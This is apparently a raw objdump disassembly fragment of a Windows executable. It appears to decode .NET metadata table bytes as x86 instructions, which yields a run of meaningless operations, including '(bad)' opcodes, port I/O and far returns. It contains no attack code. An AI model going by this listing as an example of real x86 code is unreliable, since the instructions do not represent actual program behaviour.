  405687:	00 96 00 5f 07 90    	add    %dl,-0x6ff8a100(%esi)
  40568d:	01 38                	add    %edi,(%eax)
  40568f:	00 7c 2a 00          	add    %bh,0x0(%edx,%ebp,1)
  405693:	00 00                	add    %al,(%eax)
  405695:	00 86 18 4b 02 35    	add    %al,0x35024b18(%esi)
  40569b:	00 3b                	add    %bh,(%ebx)
  40569d:	00 84 2a 00 00 00 00 	add    %al,0x0(%edx,%ebp,1)
  4056a4:	86 18                	xchg   %bl,(%eax)
  4056a6:	4b                   	dec    %ebx
  4056a7:	02 35 00 3b 00 e0    	add    0xe0003b00,%dh
  4056ad:	2a 00                	sub    (%eax),%al
  4056af:	00 00                	add    %al,(%eax)
  4056b1:	00 81 00 e3 07 9f    	add    %al,-0x60f81d00(%ecx)
  4056b7:	01 3b                	add    %edi,(%ebx)
  4056b9:	00 1c 2c             	add    %bl,(%esp,%ebp,1)
  4056bc:	00 00                	add    %al,(%eax)
  4056be:	00 00                	add    %al,(%eax)
  4056c0:	81 00 f9 07 9f 01    	addl   $0x19f07f9,(%eax)
  4056c6:	3d 00 58 2d 00       	cmp    $0x2d5800,%eax
  4056cb:	00 00                	add    %al,(%eax)
  4056cd:	00 81 00 9a 08 bb    	add    %al,-0x44f76600(%ecx)
  4056d3:	01 3f                	add    %edi,(%edi)
  4056d5:	00 40 2e             	add    %al,0x2e(%eax)
  4056d8:	00 00                	add    %al,(%eax)
  4056da:	00 00                	add    %al,(%eax)
  4056dc:	81 00 a7 08 35 00    	addl   $0x3508a7,(%eax)
  4056e2:	40                   	inc    %eax
  4056e3:	00 14 2f             	add    %dl,(%edi,%ebp,1)
  4056e6:	00 00                	add    %al,(%eax)
  4056e8:	00 00                	add    %al,(%eax)
  4056ea:	81 00 cc 08 c2 01    	addl   $0x1c208cc,(%eax)
  4056f0:	40                   	inc    %eax
  4056f1:	00 90 2f 00 00 00    	add    %dl,0x2f(%eax)
  4056f7:	00 81 00 d5 08 c9    	add    %al,-0x36f72b00(%ecx)
  4056fd:	01 42 00             	add    %eax,0x0(%edx)
  405700:	1f                   	pop    %ds
  405701:	32 00                	xor    (%eax),%al
  405703:	00 00                	add    %al,(%eax)
  405705:	00 86 00 dc 08 ec    	add    %al,-0x13f72400(%esi)
  40570b:	00 44 00 2c          	add    %al,0x2c(%eax,%eax,1)
  40570f:	32 00                	xor    (%eax),%al
  405711:	00 00                	add    %al,(%eax)
  405713:	00 86 18 4b 02 35    	add    %al,0x35024b18(%esi)
  405719:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40571d:	32 00                	xor    (%eax),%al
  40571f:	00 00                	add    %al,(%eax)
  405721:	00 86 18 4b 02 d0    	add    %al,-0x2ffdb4e8(%esi)
  405727:	00 44 00 a8          	add    %al,-0x58(%eax,%eax,1)
  40572b:	32 00                	xor    (%eax),%al
  40572d:	00 00                	add    %al,(%eax)
  40572f:	00 86 00 f4 08 d1    	add    %al,-0x2ef70c00(%esi)
  405735:	01 45 00             	add    %eax,0x0(%ebp)
  405738:	00 00                	add    %al,(%eax)
  40573a:	00 00                	add    %al,(%eax)
  40573c:	80 00 91             	addb   $0x91,(%eax)
  40573f:	20 6e 09             	and    %ch,0x9(%esi)
  405742:	df 01                	filds  (%ecx)
  405744:	46                   	inc    %esi
  405745:	00 00                	add    %al,(%eax)
  405747:	00 00                	add    %al,(%eax)
  405749:	00 80 00 91 20 7b    	add    %al,0x7b209100(%eax)
  40574f:	09 e5                	or     %esp,%ebp
  405751:	01 47 00             	add    %eax,0x0(%edi)
  405754:	f0 3a 00             	lock cmp (%eax),%al
  405757:	00 00                	add    %al,(%eax)
  405759:	00 96 00 87 09 eb    	add    %dl,-0x14f67900(%esi)
  40575f:	01 48 00             	add    %ecx,0x0(%eax)
  405762:	18 3b                	sbb    %bh,(%ebx)
  405764:	00 00                	add    %al,(%eax)
  405766:	00 00                	add    %al,(%eax)
  405768:	96                   	xchg   %eax,%esi
  405769:	00 99 09 eb 01 48    	add    %bl,0x4801eb09(%ecx)
  40576f:	00 40 3b             	add    %al,0x3b(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	00 00                	add    %al,(%eax)
  405776:	96                   	xchg   %eax,%esi
  405777:	00 ac 09 eb 01 48 00 	add    %ch,0x4801eb(%ecx,%ecx,1)
  40577e:	66 3b 00             	cmp    (%eax),%ax
  405781:	00 00                	add    %al,(%eax)
  405783:	00 86 18 4b 02 35    	add    %al,0x35024b18(%esi)
  405789:	00 48 00             	add    %cl,0x0(%eax)
  40578c:	70 3b                	jo     0x4057c9
  40578e:	00 00                	add    %al,(%eax)
  405790:	00 00                	add    %al,(%eax)
  405792:	86 18                	xchg   %bl,(%eax)
  405794:	4b                   	dec    %ebx
  405795:	02 35 00 48 00 bc    	add    0xbc004800,%dh
  40579b:	3b 00                	cmp    (%eax),%eax
  40579d:	00 00                	add    %al,(%eax)
  40579f:	00 c6                	add    %al,%dh
  4057a1:	00 4f 0b             	add    %cl,0xb(%edi)
  4057a4:	17                   	pop    %ss
  4057a5:	02 48 00             	add    0x0(%eax),%cl
  4057a8:	70 3f                	jo     0x4057e9
  4057aa:	00 00                	add    %al,(%eax)
  4057ac:	00 00                	add    %al,(%eax)
  4057ae:	c6 00 56             	movb   $0x56,(%eax)
  4057b1:	0b 2a                	or     (%edx),%ebp
  4057b3:	02 4b 00             	add    0x0(%ebx),%cl
  4057b6:	90                   	nop
  4057b7:	3f                   	aas
  4057b8:	00 00                	add    %al,(%eax)
  4057ba:	00 00                	add    %al,(%eax)
  4057bc:	c6 00 73             	movb   $0x73,(%eax)
  4057bf:	0b 37                	or     (%edi),%esi
  4057c1:	02 4f 00             	add    0x0(%edi),%cl
  4057c4:	f0 3f                	lock aas
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	00 00                	add    %al,(%eax)
  4057ca:	c6 00 73             	movb   $0x73,(%eax)
  4057cd:	0b 45 02             	or     0x2(%ebp),%eax
  4057d0:	55                   	push   %ebp
  4057d1:	00 4b 40             	add    %cl,0x40(%ebx)
  4057d4:	00 00                	add    %al,(%eax)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	c6                   	(bad)
  4057d9:	08 87 0b 4f 02 59    	or     %al,0x59024f0b(%edi)
  4057df:	00 54 40 00          	add    %dl,0x0(%eax,%eax,2)
  4057e3:	00 00                	add    %al,(%eax)
  4057e5:	00 c6                	add    %al,%dh
  4057e7:	00 a7 0b 33 01 59    	add    %ah,0x5901330b(%edi)
  4057ed:	00 84 40 00 00 00 00 	add    %al,0x0(%eax,%eax,2)
  4057f4:	81 00 cd 0b 54 02    	addl   $0x2540bcd,(%eax)
  4057fa:	59                   	pop    %ecx
  4057fb:	00 00                	add    %al,(%eax)
  4057fd:	41                   	inc    %ecx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	00 00                	add    %al,(%eax)
  405802:	c6 00 d9             	movb   $0xd9,(%eax)
  405805:	0b 54 02 59          	or     0x59(%edx,%eax,1),%edx
  405809:	00 58 41             	add    %bl,0x41(%eax)
  40580c:	00 00                	add    %al,(%eax)
  40580e:	00 00                	add    %al,(%eax)
  405810:	c6 00 f0             	movb   $0xf0,(%eax)
  405813:	0b 5a 02             	or     0x2(%edx),%ebx
  405816:	59                   	pop    %ecx
  405817:	00 5a 41             	add    %bl,0x41(%edx)
  40581a:	00 00                	add    %al,(%eax)
  40581c:	00 00                	add    %al,(%eax)
  40581e:	c6 00 f0             	movb   $0xf0,(%eax)
  405821:	0b 37                	or     (%edi),%esi
  405823:	01 5c 00 5c          	add    %ebx,0x5c(%eax,%eax,1)
  405827:	41                   	inc    %ecx
  405828:	00 00                	add    %al,(%eax)
  40582a:	00 00                	add    %al,(%eax)
  40582c:	c6 00 f6             	movb   $0xf6,(%eax)
  40582f:	0b 37                	or     (%edi),%esi
  405831:	01 5d 00             	add    %ebx,0x0(%ebp)
  405834:	5e                   	pop    %esi
  405835:	41                   	inc    %ecx
  405836:	00 00                	add    %al,(%eax)
  405838:	00 00                	add    %al,(%eax)
  40583a:	c6 00 05             	movb   $0x5,(%eax)
  40583d:	0c 37                	or     $0x37,%al
  40583f:	01 5e 00             	add    %ebx,0x0(%esi)
  405842:	60                   	pusha
  405843:	41                   	inc    %ecx
  405844:	00 00                	add    %al,(%eax)
  405846:	00 00                	add    %al,(%eax)
  405848:	c6 00 14             	movb   $0x14,(%eax)
  40584b:	0c 35                	or     $0x35,%al
  40584d:	00 5f 00             	add    %bl,0x0(%edi)
  405850:	62 41 00             	bound  %eax,0x0(%ecx)
  405853:	00 00                	add    %al,(%eax)
  405855:	00 c6                	add    %al,%dh
  405857:	00 14 0c             	add    %dl,(%esp,%ecx,1)
  40585a:	5a                   	pop    %edx
  40585b:	02 5f 00             	add    0x0(%edi),%bl
  40585e:	64 41                	fs inc %ecx
  405860:	00 00                	add    %al,(%eax)
  405862:	00 00                	add    %al,(%eax)
  405864:	c6 00 14             	movb   $0x14,(%eax)
  405867:	0c 37                	or     $0x37,%al
  405869:	01 62 00             	add    %esp,0x0(%edx)
  40586c:	68 41 00 00 00       	push   $0x41
  405871:	00 c6                	add    %al,%dh
  405873:	00 21                	add    %ah,(%ecx)
  405875:	0c 67                	or     $0x67,%al
  405877:	02 63 00             	add    0x0(%ebx),%ah
  40587a:	cc                   	int3
  40587b:	41                   	inc    %ecx
  40587c:	00 00                	add    %al,(%eax)
  40587e:	00 00                	add    %al,(%eax)
  405880:	c6 00 2f             	movb   $0x2f,(%eax)
  405883:	0c 37                	or     $0x37,%al
  405885:	01 65 00             	add    %esp,0x0(%ebp)
  405888:	ce                   	into
  405889:	41                   	inc    %ecx
  40588a:	00 00                	add    %al,(%eax)
  40588c:	00 00                	add    %al,(%eax)
  40588e:	c6 00 40             	movb   $0x40,(%eax)
  405891:	0c 37                	or     $0x37,%al
  405893:	01 66 00             	add    %esp,0x0(%esi)
  405896:	d0 41 00             	rolb   $1,0x0(%ecx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 86 18 4b 02 85    	add    %al,-0x7afdb4e8(%esi)
  4058a1:	02 67 00             	add    0x0(%edi),%ah
  4058a4:	1c 42                	sbb    $0x42,%al
  4058a6:	00 00                	add    %al,(%eax)
  4058a8:	00 00                	add    %al,(%eax)
  4058aa:	c6                   	(bad)
  4058ab:	08 b6 0c 8d 02 69    	or     %dh,0x69028d0c(%esi)
  4058b1:	00 56 42             	add    %dl,0x42(%esi)
  4058b4:	00 00                	add    %al,(%eax)
  4058b6:	00 00                	add    %al,(%eax)
  4058b8:	c6                   	(bad)
  4058b9:	08 d9                	or     %bl,%cl
  4058bb:	0c 96                	or     $0x96,%al
  4058bd:	02 69 00             	add    0x0(%ecx),%ch
  4058c0:	5e                   	pop    %esi
  4058c1:	42                   	inc    %edx
  4058c2:	00 00                	add    %al,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	c6                   	(bad)
  4058c7:	08 ec                	or     %ch,%ah
  4058c9:	0c 96                	or     $0x96,%al
  4058cb:	02 69 00             	add    0x0(%ecx),%ch
  4058ce:	66 42                	inc    %dx
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	00 00                	add    %al,(%eax)
  4058d4:	c6                   	(bad)
  4058d5:	08 01                	or     %al,(%ecx)
  4058d7:	0d 9c 02 69 00       	or     $0x69029c,%eax
  4058dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4058dd:	42                   	inc    %edx
  4058de:	00 00                	add    %al,(%eax)
  4058e0:	00 00                	add    %al,(%eax)
  4058e2:	c6                   	(bad)
  4058e3:	08 10                	or     %dl,(%eax)
  4058e5:	0d 33 01 69 00       	or     $0x690133,%eax
  4058ea:	75 42                	jne    0x40592e
  4058ec:	00 00                	add    %al,(%eax)
  4058ee:	00 00                	add    %al,(%eax)
  4058f0:	c6                   	(bad)
  4058f1:	08 19                	or     %bl,(%ecx)
  4058f3:	0d a2 02 69 00       	or     $0x6902a2,%eax
  4058f8:	7d 42                	jge    0x40593c
  4058fa:	00 00                	add    %al,(%eax)
  4058fc:	00 00                	add    %al,(%eax)
  4058fe:	c6                   	(bad)
  4058ff:	08 28                	or     %ch,(%eax)
  405901:	0d a7 02 69 00       	or     $0x6902a7,%eax
  405906:	89 42 00             	mov    %eax,0x0(%edx)
  405909:	00 00                	add    %al,(%eax)
  40590b:	00 c6                	add    %al,%dh
  40590d:	00 34 0d 35 00 69 00 	add    %dh,0x690035(,%ecx,1)
  405914:	8b 42 00             	mov    0x0(%edx),%eax
  405917:	00 00                	add    %al,(%eax)
  405919:	00 c6                	add    %al,%dh
  40591b:	00 46 0d             	add    %al,0xd(%esi)
  40591e:	35 00 69 00 8d       	xor    $0x8d006900,%eax
  405923:	42                   	inc    %edx
  405924:	00 00                	add    %al,(%eax)
  405926:	00 00                	add    %al,(%eax)
  405928:	c6 00 57             	movb   $0x57,(%eax)
  40592b:	0d 35 00 69 00       	or     $0x690035,%eax
  405930:	8f 42 00             	pop    0x0(%edx)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 c6                	add    %al,%dh
  405937:	00 6e 0d             	add    %ch,0xd(%esi)
  40593a:	35 00 69 00 91       	xor    $0x91006900,%eax
  40593f:	42                   	inc    %edx
  405940:	00 00                	add    %al,(%eax)
  405942:	00 00                	add    %al,(%eax)
  405944:	c6 00 83             	movb   $0x83,(%eax)
  405947:	0d f0 00 69 00       	or     $0x6900f0,%eax
  40594c:	ab                   	stos   %eax,%es:(%edi)
  40594d:	42                   	inc    %edx
  40594e:	00 00                	add    %al,(%eax)
  405950:	00 00                	add    %al,(%eax)
  405952:	86 18                	xchg   %bl,(%eax)
  405954:	4b                   	dec    %ebx
  405955:	02 c9                	add    %cl,%cl
  405957:	02 6a 00             	add    0x0(%edx),%ch
  40595a:	c8 42 00 00          	enter  $0x42,$0x0
  40595e:	00 00                	add    %al,(%eax)
  405960:	86 08                	xchg   %cl,(%eax)
  405962:	d4 0d                	aam    $0xd
  405964:	cb                   	lret
  405965:	00 6b 00             	add    %ch,0x0(%ebx)
  405968:	d5 42                	aad    $0x42
  40596a:	00 00                	add    %al,(%eax)
  40596c:	00 00                	add    %al,(%eax)
  40596e:	86 08                	xchg   %cl,(%eax)
  405970:	ed                   	in     (%dx),%eax
  405971:	0d d0 00 6b 00       	or     $0x6b00d0,%eax
  405976:	e3 42                	jecxz  0x4059ba
  405978:	00 00                	add    %al,(%eax)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	86 08                	xchg   %cl,(%eax)
  40597e:	06                   	push   %es
  40597f:	0e                   	push   %cs
  405980:	cb                   	lret
  405981:	00 6c 00 f0          	add    %ch,-0x10(%eax,%eax,1)
  405985:	42                   	inc    %edx
  405986:	00 00                	add    %al,(%eax)
  405988:	00 00                	add    %al,(%eax)
  40598a:	86 08                	xchg   %cl,(%eax)
  40598c:	1f                   	pop    %ds
  40598d:	0e                   	push   %cs
  40598e:	d0 00                	rolb   $1,(%eax)
  405990:	6c                   	insb   (%dx),%es:(%edi)
  405991:	00 fe                	add    %bh,%dh
  405993:	42                   	inc    %edx
  405994:	00 00                	add    %al,(%eax)
  405996:	00 00                	add    %al,(%eax)
  405998:	86 08                	xchg   %cl,(%eax)
  40599a:	38 0e                	cmp    %cl,(%esi)
  40599c:	cb                   	lret
  40599d:	00 6d 00             	add    %ch,0x0(%ebp)
  4059a0:	0b 43 00             	or     0x0(%ebx),%eax
  4059a3:	00 00                	add    %al,(%eax)
  4059a5:	00 86 08 53 0e d0    	add    %al,-0x2ff1acf8(%esi)
  4059ab:	00 6d 00             	add    %ch,0x0(%ebp)
  4059ae:	19 43 00             	sbb    %eax,0x0(%ebx)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 86 08 6e 0e cb    	add    %al,-0x34f191f8(%esi)
  4059b9:	00 6e 00             	add    %ch,0x0(%esi)
  4059bc:	26 43                	es inc %ebx
  4059be:	00 00                	add    %al,(%eax)
  4059c0:	00 00                	add    %al,(%eax)
  4059c2:	86 08                	xchg   %cl,(%eax)
  4059c4:	89 0e                	mov    %ecx,(%esi)
  4059c6:	d0 00                	rolb   $1,(%eax)
  4059c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4059c9:	00 34 43             	add    %dh,(%ebx,%eax,2)
  4059cc:	00 00                	add    %al,(%eax)
  4059ce:	00 00                	add    %al,(%eax)
  4059d0:	86 08                	xchg   %cl,(%eax)
  4059d2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4059d3:	0e                   	push   %cs
  4059d4:	cb                   	lret
  4059d5:	00 6f 00             	add    %ch,0x0(%edi)
  4059d8:	41                   	inc    %ecx
  4059d9:	43                   	inc    %ebx
  4059da:	00 00                	add    %al,(%eax)
  4059dc:	00 00                	add    %al,(%eax)
  4059de:	86 08                	xchg   %cl,(%eax)
  4059e0:	bd 0e d0 00 6f       	mov    $0x6f00d00e,%ebp
  4059e5:	00 4f 43             	add    %cl,0x43(%edi)
  4059e8:	00 00                	add    %al,(%eax)
  4059ea:	00 00                	add    %al,(%eax)
  4059ec:	86 08                	xchg   %cl,(%eax)
  4059ee:	d6                   	salc
  4059ef:	0e                   	push   %cs
  4059f0:	cb                   	lret
  4059f1:	00 70 00             	add    %dh,0x0(%eax)
  4059f4:	5c                   	pop    %esp
  4059f5:	43                   	inc    %ebx
  4059f6:	00 00                	add    %al,(%eax)
  4059f8:	00 00                	add    %al,(%eax)
  4059fa:	86 08                	xchg   %cl,(%eax)
  4059fc:	ef                   	out    %eax,(%dx)
  4059fd:	0e                   	push   %cs
  4059fe:	d0 00                	rolb   $1,(%eax)
  405a00:	70 00                	jo     0x405a02
  405a02:	6a 43                	push   $0x43
  405a04:	00 00                	add    %al,(%eax)
  405a06:	00 00                	add    %al,(%eax)
  405a08:	86 08                	xchg   %cl,(%eax)
  405a0a:	08 0f                	or     %cl,(%edi)
  405a0c:	cb                   	lret
  405a0d:	00 71 00             	add    %dh,0x0(%ecx)
  405a10:	77 43                	ja     0x405a55
  405a12:	00 00                	add    %al,(%eax)
  405a14:	00 00                	add    %al,(%eax)
  405a16:	86 08                	xchg   %cl,(%eax)
  405a18:	23 0f                	and    (%edi),%ecx
  405a1a:	d0 00                	rolb   $1,(%eax)
  405a1c:	71 00                	jno    0x405a1e
  405a1e:	85 43 00             	test   %eax,0x0(%ebx)
  405a21:	00 00                	add    %al,(%eax)
  405a23:	00 86 08 3e 0f cb    	add    %al,-0x34f0c1f8(%esi)
  405a29:	00 72 00             	add    %dh,0x0(%edx)
  405a2c:	92                   	xchg   %eax,%edx
  405a2d:	43                   	inc    %ebx
  405a2e:	00 00                	add    %al,(%eax)
  405a30:	00 00                	add    %al,(%eax)
  405a32:	86 08                	xchg   %cl,(%eax)
  405a34:	59                   	pop    %ecx
  405a35:	0f d0                	(bad)
  405a37:	00 72 00             	add    %dh,0x0(%edx)
  405a3a:	a0 43 00 00 00       	mov    0x43,%al
  405a3f:	00 86 08 74 0f cb    	add    %al,-0x34f08bf8(%esi)
  405a45:	00 73 00             	add    %dh,0x0(%ebx)
  405a48:	ad                   	lods   %ds:(%esi),%eax
  405a49:	43                   	inc    %ebx
  405a4a:	00 00                	add    %al,(%eax)
  405a4c:	00 00                	add    %al,(%eax)
  405a4e:	86 08                	xchg   %cl,(%eax)
  405a50:	90                   	nop
  405a51:	0f d0                	(bad)
  405a53:	00 73 00             	add    %dh,0x0(%ebx)
  405a56:	bb 43 00 00 00       	mov    $0x43,%ebx
  405a5b:	00 86 08 ac 0f cb    	add    %al,-0x34f053f8(%esi)
  405a61:	00 74 00 c8          	add    %dh,-0x38(%eax,%eax,1)
  405a65:	43                   	inc    %ebx
  405a66:	00 00                	add    %al,(%eax)
  405a68:	00 00                	add    %al,(%eax)
  405a6a:	86 08                	xchg   %cl,(%eax)
  405a6c:	c8 0f d0 00          	enter  $0xd00f,$0x0
  405a70:	74 00                	je     0x405a72
  405a72:	00 00                	add    %al,(%eax)
  405a74:	00 00                	add    %al,(%eax)
  405a76:	00 00                	add    %al,(%eax)
  405a78:	c6                   	(bad)
  405a79:	0d e4 0f 06 01       	or     $0x1060fe4,%eax
  405a7e:	75 00                	jne    0x405a80
  405a80:	00 00                	add    %al,(%eax)
  405a82:	00 00                	add    %al,(%eax)
  405a84:	00 00                	add    %al,(%eax)
  405a86:	c6                   	(bad)
  405a87:	0d f3 0f cf 02       	or     $0x2cf0ff3,%eax
  405a8c:	75 00                	jne    0x405a8e
  405a8e:	00 00                	add    %al,(%eax)
  405a90:	00 00                	add    %al,(%eax)
  405a92:	00 00                	add    %al,(%eax)
  405a94:	c6                   	(bad)
  405a95:	0d 02 10 ec 00       	or     $0xec1002,%eax
  405a9a:	76 00                	jbe    0x405a9c
  405a9c:	00 00                	add    %al,(%eax)
  405a9e:	00 00                	add    %al,(%eax)
  405aa0:	00 00                	add    %al,(%eax)
  405aa2:	c6                   	(bad)
  405aa3:	0d 0f 10 f0 00       	or     $0xf0100f,%eax
  405aa8:	76 00                	jbe    0x405aaa
  405aaa:	d6                   	salc
  405aab:	43                   	inc    %ebx
  405aac:	00 00                	add    %al,(%eax)
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	e6 09                	out    %al,$0x9
  405ab2:	e4 0f                	in     $0xf,%al
  405ab4:	06                   	push   %es
  405ab5:	01 77 00             	add    %esi,0x0(%edi)
  405ab8:	de 43 00             	fiadds 0x0(%ebx)
  405abb:	00 00                	add    %al,(%eax)
  405abd:	00 e6                	add    %ah,%dh
  405abf:	09 f3                	or     %esi,%ebx
  405ac1:	0f cf                	bswap  %edi
  405ac3:	02 77 00             	add    0x0(%edi),%dh
  405ac6:	e7 43                	out    %eax,$0x43
  405ac8:	00 00                	add    %al,(%eax)
  405aca:	00 00                	add    %al,(%eax)
  405acc:	e6 09                	out    %al,$0x9
  405ace:	02 10                	add    (%eax),%dl
  405ad0:	ec                   	in     (%dx),%al
  405ad1:	00 78 00             	add    %bh,0x0(%eax)
  405ad4:	ef                   	out    %eax,(%dx)
  405ad5:	43                   	inc    %ebx
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	e6 09                	out    %al,$0x9
  405adc:	0f 10 f0             	movups %xmm0,%xmm6
  405adf:	00 78 00             	add    %bh,0x0(%eax)
  405ae2:	64 44                	fs inc %esp
  405ae4:	00 00                	add    %al,(%eax)
  405ae6:	00 00                	add    %al,(%eax)
  405ae8:	91                   	xchg   %eax,%ecx
  405ae9:	00 44 10 d4          	add    %al,-0x2c(%eax,%edx,1)
  405aed:	02 79 00             	add    0x0(%ecx),%bh
  405af0:	ec                   	in     (%dx),%al
  405af1:	49                   	dec    %ecx
  405af2:	00 00                	add    %al,(%eax)
  405af4:	00 00                	add    %al,(%eax)
  405af6:	91                   	xchg   %eax,%ecx
  405af7:	00 65 10             	add    %ah,0x10(%ebp)
  405afa:	da 02                	fiaddl (%edx)
  405afc:	7a 00                	jp     0x405afe
  405afe:	07                   	pop    %es
  405aff:	4a                   	dec    %edx
  405b00:	00 00                	add    %al,(%eax)
  405b02:	00 00                	add    %al,(%eax)
  405b04:	86 18                	xchg   %bl,(%eax)
  405b06:	4b                   	dec    %ebx
  405b07:	02 35 00 7c 00 f8    	add    0xf8007c00,%dh
  405b0d:	43                   	inc    %ebx
  405b0e:	00 00                	add    %al,(%eax)
  405b10:	00 00                	add    %al,(%eax)
  405b12:	86 18                	xchg   %bl,(%eax)
  405b14:	4b                   	dec    %ebx
  405b15:	02 35 00 7c 00 00    	add    0x7c00,%dh
  405b1b:	44                   	inc    %esp
  405b1c:	00 00                	add    %al,(%eax)
  405b1e:	00 00                	add    %al,(%eax)
  405b20:	86 00                	xchg   %al,(%eax)
  405b22:	79 1e                	jns    0x405b42
  405b24:	86 06                	xchg   %al,(%esi)
  405b26:	7c 00                	jl     0x405b28
  405b28:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405b2c:	00 00                	add    %al,(%eax)
  405b2e:	86 00                	xchg   %al,(%eax)
  405b30:	84 1e                	test   %bl,(%esi)
  405b32:	86 06                	xchg   %al,(%esi)
  405b34:	7e 00                	jle    0x405b36
  405b36:	4b                   	dec    %ebx
  405b37:	44                   	inc    %esp
  405b38:	00 00                	add    %al,(%eax)
  405b3a:	00 00                	add    %al,(%eax)
  405b3c:	86 00                	xchg   %al,(%eax)
  405b3e:	9c                   	pushf
  405b3f:	1e                   	push   %ds
  405b40:	8e 06                	mov    (%esi),%es
  405b42:	80 00 00             	addb   $0x0,(%eax)
  405b45:	00 01                	add    %al,(%ecx)
  405b47:	00 86 10 00 00 02    	add    %al,0x2000010(%esi)
  405b4d:	00 8f 10 00 00 03    	add    %cl,0x3000010(%edi)
  405b53:	00 9a 10 00 00 04    	add    %bl,0x4000010(%edx)
  405b59:	00 a4 10 00 00 05 00 	add    %ah,0x50000(%eax,%edx,1)
  405b60:	ab                   	stos   %eax,%es:(%edi)
  405b61:	10 00                	adc    %al,(%eax)
  405b63:	00 06                	add    %al,(%esi)
  405b65:	00 b4 10 00 00 07 00 	add    %dh,0x70000(%eax,%edx,1)
  405b6c:	c0 10 00             	rclb   $0x0,(%eax)
  405b6f:	00 08                	add    %cl,(%eax)
  405b71:	00 c9                	add    %cl,%cl
  405b73:	10 00                	adc    %al,(%eax)
  405b75:	20 09                	and    %cl,(%ecx)
  405b77:	00 d5                	add    %dl,%ch
  405b79:	10 00                	adc    %al,(%eax)
  405b7b:	00 0a                	add    %cl,(%edx)
  405b7d:	00 1c 11             	add    %bl,(%ecx,%edx,1)
  405b80:	00 00                	add    %al,(%eax)
  405b82:	01 00                	add    %eax,(%eax)
  405b84:	22 11                	and    (%ecx),%dl
  405b86:	00 00                	add    %al,(%eax)
  405b88:	02 00                	add    (%eax),%al
  405b8a:	2a 11                	sub    (%ecx),%dl
  405b8c:	00 00                	add    %al,(%eax)
  405b8e:	03 00                	add    (%eax),%eax
  405b90:	32 11                	xor    (%ecx),%dl
  405b92:	00 00                	add    %al,(%eax)
  405b94:	04 00                	add    $0x0,%al
  405b96:	39 11                	cmp    %edx,(%ecx)
  405b98:	00 00                	add    %al,(%eax)
  405b9a:	05 00 3e 11 00       	add    $0x113e00,%eax
  405b9f:	00 06                	add    %al,(%esi)
  405ba1:	00 48 11             	add    %cl,0x11(%eax)
  405ba4:	00 00                	add    %al,(%eax)
  405ba6:	01 00                	add    %eax,(%eax)
  405ba8:	50                   	push   %eax
  405ba9:	11 00                	adc    %eax,(%eax)
  405bab:	00 01                	add    %al,(%ecx)
  405bad:	00 50 11             	add    %dl,0x11(%eax)
  405bb0:	00 00                	add    %al,(%eax)
  405bb2:	01 00                	add    %eax,(%eax)
  405bb4:	50                   	push   %eax
  405bb5:	11 00                	adc    %eax,(%eax)
  405bb7:	00 01                	add    %al,(%ecx)
  405bb9:	00 50 11             	add    %dl,0x11(%eax)
  405bbc:	00 00                	add    %al,(%eax)
  405bbe:	01 00                	add    %eax,(%eax)
  405bc0:	50                   	push   %eax
  405bc1:	11 00                	adc    %eax,(%eax)
  405bc3:	00 01                	add    %al,(%ecx)
  405bc5:	00 56 11             	add    %dl,0x11(%esi)
  405bc8:	00 00                	add    %al,(%eax)
  405bca:	01 00                	add    %eax,(%eax)
  405bcc:	48                   	dec    %eax
  405bcd:	11 00                	adc    %eax,(%eax)
  405bcf:	00 01                	add    %al,(%ecx)
  405bd1:	00 60 11             	add    %ah,0x11(%eax)
  405bd4:	00 00                	add    %al,(%eax)
  405bd6:	02 00                	add    (%eax),%al
  405bd8:	67 11 00             	adc    %eax,(%bx,%si)
  405bdb:	00 03                	add    %al,(%ebx)
  405bdd:	00 73 11             	add    %dh,0x11(%ebx)
  405be0:	00 00                	add    %al,(%eax)
  405be2:	04 00                	add    $0x0,%al
  405be4:	78 11                	js     0x405bf7
  405be6:	00 00                	add    %al,(%eax)
  405be8:	01 00                	add    %eax,(%eax)
  405bea:	56                   	push   %esi
  405beb:	11 00                	adc    %eax,(%eax)
  405bed:	00 02                	add    %al,(%edx)
  405bef:	00 78 11             	add    %bh,0x11(%eax)
  405bf2:	00 00                	add    %al,(%eax)
  405bf4:	01 00                	add    %eax,(%eax)
  405bf6:	7d 11                	jge    0x405c09
  405bf8:	00 00                	add    %al,(%eax)
  405bfa:	02 00                	add    (%eax),%al
  405bfc:	84 11                	test   %dl,(%ecx)
  405bfe:	00 00                	add    %al,(%eax)
  405c00:	01 00                	add    %eax,(%eax)
  405c02:	50                   	push   %eax
  405c03:	11 00                	adc    %eax,(%eax)
  405c05:	00 01                	add    %al,(%ecx)
  405c07:	00 50 11             	add    %dl,0x11(%eax)
  405c0a:	00 00                	add    %al,(%eax)
  405c0c:	01 00                	add    %eax,(%eax)
  405c0e:	50                   	push   %eax
  405c0f:	11 00                	adc    %eax,(%eax)
  405c11:	00 01                	add    %al,(%ecx)
  405c13:	00 8d 11 00 00 01    	add    %cl,0x1000011(%ebp)
  405c19:	00 93 11 00 00 02    	add    %dl,0x2000011(%ebx)
  405c1f:	00 9c 11 00 00 03 00 	add    %bl,0x30000(%ecx,%edx,1)
  405c26:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405c27:	11 00                	adc    %eax,(%eax)
  405c29:	00 04 00             	add    %al,(%eax,%eax,1)
  405c2c:	ad                   	lods   %ds:(%esi),%eax
  405c2d:	11 00                	adc    %eax,(%eax)
  405c2f:	00 01                	add    %al,(%ecx)
  405c31:	00 93 11 00 00 02    	add    %dl,0x2000011(%ebx)
  405c37:	00 9c 11 00 00 03 00 	add    %bl,0x30000(%ecx,%edx,1)
  405c3e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405c3f:	11 00                	adc    %eax,(%eax)
